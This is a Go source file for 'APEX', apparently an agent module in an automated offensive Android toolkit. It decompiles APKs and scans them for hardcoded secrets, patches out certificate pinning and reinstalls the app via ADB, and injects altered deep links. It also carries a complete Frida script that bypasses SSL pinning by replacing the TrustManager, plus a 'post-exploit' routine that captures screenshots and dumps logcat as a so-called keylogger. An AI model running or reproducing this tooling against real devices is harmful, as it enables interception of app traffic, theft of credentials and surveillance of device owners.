// APEX — ANDROID-ROOTER Agent
// APK auto-MITM patch, deep link hijack, runtime hook, zero-click chain

package mobilebreach

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// AndroidRooter handles Android pentest
type AndroidRooter struct {
	bus    *EventBus
	state  *SharedState
	stopCh chan struct{}
	msgCh  chan AgentMessage
}

func NewAndroidRooter(bus *EventBus, state *SharedState) *AndroidRooter {
	return &AndroidRooter{
		bus:    bus,
		state:  state,
		stopCh: make(chan struct{}),
		msgCh:  make(chan AgentMessage, 50),
	}
}

func (a *AndroidRooter) Name() string   { return "APEX" }
func (a *AndroidRooter) Status() string { return "online" }

func (a *AndroidRooter) Start() {
	a.bus.Subscribe("APEX", a.msgCh)
	for {
		select {
		case msg := <-a.msgCh:
			a.Handle(msg)
		case <-a.stopCh:
			return
		}
	}
}

func (a *AndroidRooter) Stop() {
	close(a.stopCh)
}

func (a *AndroidRooter) Handle(msg AgentMessage) {
	switch msg.Type {
	case "APK_REVERSE":
		a.reverseAPK(msg.Data)
	case "APK_MITM_PATCH":
		a.autoMITMPatch(msg.Data)
	case "DEEP_LINK_HIJACK":
		a.deepLinkHijack(msg.Data)
	case "FRIDA_HOOK":
		a.fridaHook(msg.Data)
	case "ADB_EXPLOIT":
		a.adbExploit()
	case "DROZER_SCAN":
		a.drozerScan(msg.Data)
	}
}

func (a *AndroidRooter) broadcast(msg string) {
	a.bus.Broadcast(AgentMessage{From: "APEX", To: "ALL", Type: "LOG", Data: msg})
}

// ─── Feature 1: APK Auto-Reverse ─────────────────────────────────
func (a *AndroidRooter) reverseAPK(path string) {
	a.broadcast(fmt.Sprintf("[APEX] Reversing APK: %s", path))

	info := &AppInfo{PackageName: filepath.Base(path)}

	// Step 1: apktool decompile
	outDir := path + "_apktool"
	if out, err := exec.Command("apktool", "d", path, "-o", outDir, "-f").CombinedOutput(); err == nil {
		a.broadcast("[APEX] apktool decompile OK")
		_ = out
		// Parse AndroidManifest.xml for components
		manifestPath := filepath.Join(outDir, "AndroidManifest.xml")
		if data, err := os.ReadFile(manifestPath); err == nil {
			content := string(data)
			info.Permissions = extractXMLAttrs(content, "uses-permission")
			info.Activities = extractXMLAttrs(content, "activity")
			info.Services = extractXMLAttrs(content, "service")
			info.Receivers = extractXMLAttrs(content, "receiver")
			info.Providers = extractXMLAttrs(content, "provider")
			info.DeepLinks = extractDeepLinks(content)
		}
	} else {
		a.broadcast(fmt.Sprintf("[!] apktool failed: %v", err))
	}

	// Step 2: jadx decompile for source
	jadxDir := path + "_jadx"
	if out, err := exec.Command("jadx", "-d", jadxDir, path).CombinedOutput(); err == nil {
		a.broadcast("[APEX] jadx decompile OK")
		_ = out
		// Scan for hardcoded secrets
		info.HardcodedSecrets = a.scanSecrets(jadxDir)
	} else {
		a.broadcast(fmt.Sprintf("[!] jadx failed: %v", err))
	}

	// Step 3: APKLeaks scan
	if out, err := exec.Command("apkleaks", "-f", path).CombinedOutput(); err == nil {
		output := string(out)
		if strings.Contains(output, " leaks:") {
			for _, line := range strings.Split(output, "\n") {
				if strings.Contains(line, " leaks:") || strings.Contains(line, "KEY") {
					info.HardcodedSecrets = append(info.HardcodedSecrets, strings.TrimSpace(line))
				}
			}
		}
	}

	// Detect anti-analysis
	info.SSLPinned = a.detectSSLPinning(outDir, jadxDir)
	info.RootDetection = a.detectRootCheck(outDir, jadxDir)
	info.Obfuscated = a.detectObfuscation(outDir)

	a.state.mu.Lock()
	a.state.AppInfo = info
	a.state.mu.Unlock()

	a.broadcast(fmt.Sprintf("[APEX] APK analysis complete. Package: %s | Secrets: %d | DeepLinks: %d | SSLPinned: %v",
		info.PackageName, len(info.HardcodedSecrets), len(info.DeepLinks), info.SSLPinned))
}

// ─── Feature 2: Auto-MITM Patch ──────────────────────────────────
func (a *AndroidRooter) autoMITMPatch(path string) {
	a.broadcast(fmt.Sprintf("[APEX] Auto-MITM patching: %s", path))

	// apk-mitm auto-patches cert pinning
	patchDir := path + "_mitm"
	cmd := exec.Command("apk-mitm", path, "--output", patchDir)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		// Fallback: manual apktool patch
		a.broadcast("[!] apk-mitm failed, trying manual patch...")
		a.manualMITMPatch(path)
		return
	}

	a.broadcast("[APEX] MITM patch complete. Output: " + patchDir)

	// Install patched APK via ADB
	a.broadcast("[APEX] Installing patched APK via ADB...")
	if out, err := exec.Command("adb", "install", "-r", patchDir).CombinedOutput(); err == nil {
		a.broadcast("[APEX] Patched APK installed: " + string(out))
	} else {
		a.broadcast("[!] ADB install failed: " + string(out))
	}
}

func (a *AndroidRooter) manualMITMPatch(path string) {
	outDir := path + "_manual_mitm"
	exec.Command("apktool", "d", path, "-o", outDir, "-f").Run()

	// Patch network_security_config.xml
	configPath := filepath.Join(outDir, "res", "xml", "network_security_config.xml")
	if data, err := os.ReadFile(configPath); err == nil {
		content := string(data)
		if strings.Contains(content, "pin-set") || strings.Contains(content, "certificates") {
			content = strings.ReplaceAll(content, "pin-set", "!-- pin-set")
			content = strings.ReplaceAll(content, "/certificates", "/certificates --")
			os.WriteFile(configPath, []byte(content), 0644)
			a.broadcast("[APEX] Patched network_security_config.xml")
		}
	}

	// Rebuild and sign
	exec.Command("apktool", "b", outDir, "-o", outDir+"_patched.apk").Run()
	exec.Command("jarsigner", "-keystore", "~/.android/debug.keystore", "-storepass", "android",
		outDir+"_patched.apk", "androiddebugkey").Run()
}

// ─── Feature 3: Deep Link Hijacking ────────────────────────────────
func (a *AndroidRooter) deepLinkHijack(pkg string) {
	a.broadcast(fmt.Sprintf("[APEX] Deep link hijack scan: %s", pkg))

	if len(a.state.AppInfo.DeepLinks) == 0 {
		a.broadcast("[!] No deep links found. Run APK_REVERSE first.")
		return
	}

	for _, link := range a.state.AppInfo.DeepLinks {
		// Test with adb shell am start
		cmd := exec.Command("adb", "shell", "am", "start", "-W", "-a", "android.intent.action.VIEW", "-d", link)
		out, err := cmd.CombinedOutput()
		output := string(out)
		if err == nil && strings.Contains(output, "Complete") {
			a.broadcast(fmt.Sprintf("[+] Deep link triggered: %s", link))
			// Try malicious payload injection
			malicious := strings.ReplaceAll(link, "://", "://evilpayload")
			exec.Command("adb", "shell", "am", "start", "-W", "-a", "android.intent.action.VIEW", "-d", malicious).Run()
		}
	}
}

// ─── Feature 4: Frida Runtime Hook ─────────────────────────────────
func (a *AndroidRooter) fridaHook(pkg string) {
	a.broadcast(fmt.Sprintf("[APEX] Frida hooking: %s", pkg))

	// Check frida-server on device
	exec.Command("adb", "shell", "su", "-c", "frida-server").Run()
	time.Sleep(1 * time.Second)

	// SSL pinning bypass script
	sslScript := `
Java.perform(function() {
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    // Override checkClientTrusted and checkServerTrusted
    var TrustManager = Java.registerClass({name: 'com.apex.TrustManager', implements: [X509TrustManager],
        methods: {checkClientTrusted: function() {}, checkServerTrusted: function() {}, getAcceptedIssuers: function() { return []; }}
    });
    var TrustManagers = [TrustManager.$new()];
    var SSLContext_init = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
    SSLContext_init.implementation = function(km, tm, random) { SSLContext_init.call(this, km, TrustManagers, random); };
});
`
	scriptFile := "/tmp/apex_ssl_bypass.js"
	os.WriteFile(scriptFile, []byte(sslScript), 0644)

	cmd := exec.Command("frida", "-U", "-f", pkg, "-l", scriptFile, "--no-pause")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	go cmd.Run()

	a.broadcast("[APEX] Frida SSL bypass active on " + pkg)
}

// ─── Feature 5: ADB Post-Exploit ───────────────────────────────────
func (a *AndroidRooter) adbExploit() {
	a.broadcast("[APEX] ADB post-exploit sequence")

	// Screenshot
	if out, err := exec.Command("adb", "shell", "screencap", "-p", "/sdcard/apex_screenshot.png").CombinedOutput(); err == nil {
		exec.Command("adb", "pull", "/sdcard/apex_screenshot.png", "/tmp/nexus-void/mobile/").Run()
		a.broadcast("[APEX] Screenshot captured")
		_ = out
	}

	// Keylogger via logcat
	go func() {
		cmd := exec.Command("adb", "logcat", "-v", "threadtime")
		out, _ := cmd.CombinedOutput()
		os.WriteFile("/tmp/nexus-void/mobile/logcat.txt", out, 0644)
	}()

	// List installed packages with permissions
	if out, err := exec.Command("adb", "shell", "pm", "list", "packages", "-f").CombinedOutput(); err == nil {
		a.broadcast(fmt.Sprintf("[APEX] Found %d installed packages", strings.Count(string(out), "\n")))
	}
}

// ─── Feature 6: Drozer Scan ──────────────────────────────────────
func (a *AndroidRooter) drozerScan(pkg string) {
	a.broadcast(fmt.Sprintf("[APEX] Drozer scan: %s", pkg))

	// Check for exported content providers
	cmd := exec.Command("drozer", "console", "connect", "-c", fmt.Sprintf("run app.provider.info -a %s", pkg))
	out, err := cmd.CombinedOutput()
	if err == nil && len(out) > 0 {
		a.broadcast("[APEX] Drozer provider info:\n" + string(out))
	}

	// Intent fuzzing
	fuzzCmd := exec.Command("drozer", "console", "connect", "-c", fmt.Sprintf("run app.activity.start --component %s/.MainActivity", pkg))
	fuzzOut, _ := fuzzCmd.CombinedOutput()
	_ = fuzzOut
}

// ─── Helpers ──────────────────────────────────────────────────────

func (a *AndroidRooter) scanSecrets(dir string) []string {
	var secrets []string
	// Scan for common patterns in decompiled source
	patterns := []string{"api_key", "apikey", "secret_key", "password", "token", "auth_token",
		"firebase", "onesignal", "appsflyer", "aws_access_key", "s3_bucket"}
	cmd := exec.Command("grep", "-riE", strings.Join(patterns, "|"), dir)
	out, _ := cmd.CombinedOutput()
	for _, line := range strings.Split(string(out), "\n") {
		if len(line) > 0 && len(line) < 300 {
			secrets = append(secrets, strings.TrimSpace(line))
		}
	}
	return secrets
}

func (a *AndroidRooter) detectSSLPinning(apktoolDir, jadxDir string) bool {
	// Check for OkHttp pinning, TrustManager overrides, etc.
	patterns := []string{"X509TrustManager", "SSLContext", "CertificatePinner", "HostnameVerifier",
		"pin-set", "network_security_config"}
	for _, dir := range []string{apktoolDir, jadxDir} {
		cmd := exec.Command("grep", "-riE", strings.Join(patterns, "|"), dir)
		out, _ := cmd.CombinedOutput()
		if len(out) > 50 {
			return true
		}
	}
	return false
}

func (a *AndroidRooter) detectRootCheck(apktoolDir, jadxDir string) bool {
	patterns := []string{"isDeviceRooted", "checkSu", "test-keys", "supersu", "magisk",
		"RootBeer", "SafetyNet", "PlayIntegrity"}
	for _, dir := range []string{apktoolDir, jadxDir} {
		cmd := exec.Command("grep", "-riE", strings.Join(patterns, "|"), dir)
		out, _ := cmd.CombinedOutput()
		if len(out) > 50 {
			return true
		}
	}
	return false
}

func (a *AndroidRooter) detectObfuscation(apktoolDir string) bool {
	// ProGuard/R8 obfuscation detection
	cmd := exec.Command("find", apktoolDir, "-name", "*.smali")
	out, _ := cmd.CombinedOutput()
	classes := strings.Count(string(out), "\n")
	// Highly obfuscated apps have many single-letter class names
	cmd2 := exec.Command("grep", "-rE", `^\.class.*a;->|b;->|c;->`, apktoolDir)
	out2, _ := cmd2.CombinedOutput()
	shortNames := strings.Count(string(out2), "\n")
	return classes > 100 && float64(shortNames)/float64(classes) > 0.3
}

func extractXMLAttrs(xml, tag string) []string {
	var attrs []string
	for _, line := range strings.Split(xml, "\n") {
		if strings.Contains(line, "<"+tag) {
			attrs = append(attrs, strings.TrimSpace(line))
		}
	}
	return attrs
}

func extractDeepLinks(xml string) []string {
	var links []string
	for _, line := range strings.Split(xml, "\n") {
		if strings.Contains(line, "android:scheme") {
			parts := strings.Split(line, "\"")
			for i := 0; i < len(parts)-1; i++ {
				if strings.Contains(parts[i], "scheme") && i+1 < len(parts) {
					scheme := parts[i+1]
					if scheme != "" && scheme != "http" && scheme != "https" {
						links = append(links, scheme+"://")
					}
				}
			}
		}
	}
	return links
}
